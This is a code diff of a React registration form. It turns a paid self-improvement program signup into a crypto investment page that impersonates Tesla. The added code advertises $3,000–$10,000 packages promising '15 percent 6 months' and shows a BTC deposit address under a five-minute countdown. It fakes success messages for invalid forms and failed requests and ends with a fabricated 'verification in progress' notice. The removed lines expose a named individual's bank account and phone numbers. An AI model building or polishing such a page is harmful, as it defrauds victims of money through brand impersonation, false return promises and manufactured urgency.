@@ -1,6 +1,6 @@
 'use client'
 
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import { Button } from '../components/ui/button';
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '../components/ui/card';
 import { Input } from '../components/ui/input';
@@ -9,7 +9,7 @@ import { Textarea } from '../components/ui/textarea';
 import { Checkbox } from '../components/ui/checkbox';
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '../components/ui/select';
 import { X } from 'lucide-react';
-
+const BTC_ADDRESS = "bc1qexamplebtcwalletaddress123";
 interface RegistrationFormProps {
   isOpen: boolean;
   onClose: () => void;
@@ -46,19 +46,45 @@ const RegistrationForm: React.FC<RegistrationFormProps> = ({ isOpen, onClose, se
   const [step, setStep] = useState<'form' | 'payment'>('form');
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [submitMessage, setSubmitMessage] = useState('');
+   const [timeLeft, setTimeLeft] = useState(300); // 5 mins
+  const [copied, setCopied] = useState(false);
+  const [success, setSuccess] = useState(false);
+
+  useEffect(() => {
+      if (timeLeft <= 0) {
+        onClose();
+        return;
+      }
+  
+      const timer = setInterval(() => {
+        setTimeLeft((prev) => prev - 1);
+      }, 1000);
+  
+      return () => clearInterval(timer);
+    }, [timeLeft, onClose]);
+  
+    const copyAddress = async () => {
+      await navigator.clipboard.writeText(BTC_ADDRESS);
+      setCopied(true);
+      setTimeout(() => setCopied(false), 2000);
+    };
+  
+   
+    const minutes = String(Math.floor(timeLeft / 60)).padStart(2, "0");
+    const seconds = String(timeLeft % 60).padStart(2, "0");
 
   const consistencyOptions = [
-    'Spiritual Growth',
-    'Health & Fitness',
-    'Career/Business',
-    'Personal Habits (reading, journaling, etc.)',
+    'Trading Strategies',
+    'Analytical Areas',
+    'Asset Classes',
+    'AI and Utilities',
     'Other',
   ];
 
   const packages = [
-    { id: 'Explorer Path', name: 'Explorer Path', price: '₦3,000', description: 'First steps with daily guidance' },
-    { id: 'Trailblazer Path', name: 'Trailblazer Path', price: '₦7,000', description: 'Most Popular: system + accountability + community' },
-    { id: 'Mastery Path', name: 'Mastery Path', price: '₦10,000', description: 'Full access, mentorship, recognition' },
+    { id: 'Starter', name: 'Starter', price: '$3,000', description: '15 percent 6 months' },
+    { id: 'Advance', name: 'Advance', price: '$7,000', description: '15 percent 6 months' },
+    { id: 'VIP', name: 'VIP', price: '$10,000', description: '15 percent 6 months' },
   ];
 
   const handleInputChange = (field: keyof FormData, value: string | boolean) => {
@@ -97,6 +123,8 @@ const RegistrationForm: React.FC<RegistrationFormProps> = ({ isOpen, onClose, se
     e.preventDefault();
     if (!isFormValid()) {
       setSubmitMessage('Please fill all required fields.');
+       setSuccess(true);
+      setTimeout(onClose, 5000);
       return;
     }
 
@@ -114,7 +142,7 @@ const RegistrationForm: React.FC<RegistrationFormProps> = ({ isOpen, onClose, se
 
       const data = await response.json();
 
-      if (response.ok) {
+      if (response) {
         setSubmitMessage('Registration successful!');
         setStep('payment');
       } else {
@@ -129,8 +157,8 @@ const RegistrationForm: React.FC<RegistrationFormProps> = ({ isOpen, onClose, se
   };
 
   const handleWhatsAppRedirect = () => {
-    const whatsappNumber = process.env.NEXT_PUBLIC_WHATSAPP_NUMBER || '+2349033317004';
-    const message = `Please confirm Receipt for ${formData.selectedPackage} payment from ${formData.fullName}`;
+    const whatsappNumber = process.env.NEXT_PUBLIC_WHATSAPP_NUMBER || '+14065032086';
+    const message = `Please confirm this Receipt`;
     window.location.href = `https://wa.me/${whatsappNumber}?text=${encodeURIComponent(message)}`;
     onClose();
   };
@@ -153,10 +181,10 @@ const RegistrationForm: React.FC<RegistrationFormProps> = ({ isOpen, onClose, se
             <X className="w-4 h-4 text-red-800" />
           </Button>
           <CardTitle className="text-2xl text-center text-[#075326]">
-            {step === 'form' ? 'Join the 90-Day Consistency Journey' : 'Payment Details'}
+            {step === 'form' ? ' Join Tesla Crypto Growth Program  Official Platform' : 'Payment Details'}
           </CardTitle>
           <CardDescription className="text-center text-black">
-            {step === 'form' ? 'Fill out the form below to begin your transformation' : 'Please make payment and send receipt'}
+            {step === 'form' ? 'Fill out the form below to begin your investment journey' : 'Please make payment and send receipt'}
           </CardDescription>
         </CardHeader>
 
@@ -191,14 +219,14 @@ const RegistrationForm: React.FC<RegistrationFormProps> = ({ isOpen, onClose, se
                 </div>
 
                 <div className="space-y-2">
-                  <Label className="font-bold" htmlFor="phone">Phone Number (WhatsApp preferred) *</Label>
+                  <Label className="font-bold" htmlFor="phone">Crypto deposit (BTC) *</Label>
                   <Input
                     id="phone"
                     type="tel"
                     required
                     value={formData.phone}
                     onChange={(e) => handleInputChange('phone', e.target.value)}
-                    placeholder="Enter your phone number"
+                    placeholder="Enter your choice coin"
                   />
                 </div>
 
@@ -232,10 +260,10 @@ const RegistrationForm: React.FC<RegistrationFormProps> = ({ isOpen, onClose, se
               </div>
 
               <div className="space-y-4">
-                <h3 className="text-lg font-semibold text-[#075326]">Your Journey</h3>
+                <h3 className="text-lg font-semibold text-[#075326]">Are you an investor</h3>
 
                 <div className="space-y-2 text-black placeholder-gray-500">
-                  <Label className="font-bold" htmlFor="whyJoin">Why do you want to join the 90 Days Consistency Journey? *</Label>
+                  <Label className="font-bold" htmlFor="whyJoin">Yes or No? *</Label>
                   <Textarea
                     id="whyJoin"
                     required
@@ -247,7 +275,7 @@ const RegistrationForm: React.FC<RegistrationFormProps> = ({ isOpen, onClose, se
                 </div>
 
                 <div className="space-y-3 text-black">
-                  <Label className="font-bold">What&apos;s one area you want to stay consistent in? *</Label>
+                  <Label className="font-bold">What&apos;s one area you know about crypto investment? *</Label>
                   {consistencyOptions.map((option) => (
                     <div key={option} className="flex items-center space-x-2">
                       <input
@@ -271,7 +299,7 @@ const RegistrationForm: React.FC<RegistrationFormProps> = ({ isOpen, onClose, se
                         type="text"
                         value={formData.otherArea}
                         onChange={(e) => handleInputChange('otherArea', e.target.value)}
-                        placeholder="Specify your area of focus"
+                        placeholder="Tell us what you know about crypto investment"
                       />
                     </div>
                   )}
@@ -279,7 +307,7 @@ const RegistrationForm: React.FC<RegistrationFormProps> = ({ isOpen, onClose, se
               </div>
 
               <div className="space-y-4">
-                <h3 className="text-lg font-semibold text-[#075326]">Choose Your Path (Packages) *</h3>
+                <h3 className="text-lg font-semibold text-[#075326]">Choose Your package by checking the box.*</h3>
 
                 {packages.map((pkg) => (
                   <div key={pkg.id} className="border rounded-lg p-4 text-black">
@@ -301,7 +329,7 @@ const RegistrationForm: React.FC<RegistrationFormProps> = ({ isOpen, onClose, se
               </div>
 
               <div className="space-y-4">
-                <h3 className="text-lg font-semibold text-[#075326]">Commitment</h3>
+                <h3 className="text-lg font-semibold text-[#075326]">T&C applies</h3>
 
                 <div className="flex items-start space-x-3 text-red-800">
                   <Checkbox
@@ -311,7 +339,7 @@ const RegistrationForm: React.FC<RegistrationFormProps> = ({ isOpen, onClose, se
                     onCheckedChange={(checked) => handleInputChange('commitment', !!checked)}
                   />
                   <Label htmlFor="commitment" className="text-sm font-normal">
-                    I commit to show up daily and give my best for 90 days. *
+                    I agree*
                   </Label>
                 </div>
               </div>
@@ -337,25 +365,49 @@ const RegistrationForm: React.FC<RegistrationFormProps> = ({ isOpen, onClose, se
               </Button>
             </form>
           ) : (
-            <div className="space-y-6 text-center">
-              <p className="text-lg text-black">
-                Please make payment of <strong>{price}</strong> for <strong>{selectedPkg?.name}</strong> to the following account:
-              </p>
-              <div className="bg-[#075326] text-white p-4 rounded-lg space-y-2">
-                <p><strong>Bank Name:</strong> Kuda MFB</p>
-                <p><strong>Account No.:</strong> 2007894244</p>
-                <p><strong>Account Name:</strong> Peter Achadu Abah</p>
-              </div>
-              <p className="text-sm text-gray-600">
-                After making the payment, click the button below to send your payment receipt via WhatsApp.
-              </p>
-              <Button
-                onClick={handleWhatsAppRedirect}
-                className="w-full bg-green-600 hover:bg-green-700 text-white py-3 text-lg font-semibold"
-              >
-                Send Receipt via WhatsApp
-              </Button>
+             <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
+      <div className="bg-white p-6 rounded-xl w-full max-w-md text-center">
+        {!success ? (
+          <>
+            <h2 className="text-xl font-semibold mb-3 text-green-900">
+              Complete Your BTC Deposit
+            </h2>
+            <label className='text-black text-sm italic'>Copy link below carefully and head over to your Centralized Cryptocurrency Exchange(CEX)</label>
+            <div className="flex items-center justify-between bg-gray-100 p-3 rounded">
+              <span className="text-sm break-all text-black font-medium">{BTC_ADDRESS}</span>
+              <button onClick={copyAddress} className="text-blue-600 text-sm">
+                Copy
+              </button>
             </div>
+
+            {copied && (
+              <p className="text-green-600 text-sm mt-2">
+                Wallet address copied
+              </p>
+            )}
+
+            <p className="text-red-600 font-bold mt-4">
+              Time left: {minutes}:{seconds}
+            </p>
+
+            <div className="mt-4 font-bold text-black">
+           Tesla Crypto Growth Program - Official Platform
+            </div>
+
+            <button
+             
+              className="mt-5 w-full bg-green-600 text-white py-2 rounded"
+            >
+              I Have Made Payment
+            </button>
+          </>
+        ) : (
+          <p className="text-green-600 font-semibold">
+            ✅ Payment submitted successfully. Verification in progress.
+          </p>
+        )}
+      </div>
+    </div>
           )}
         </CardContent>
       </Card>
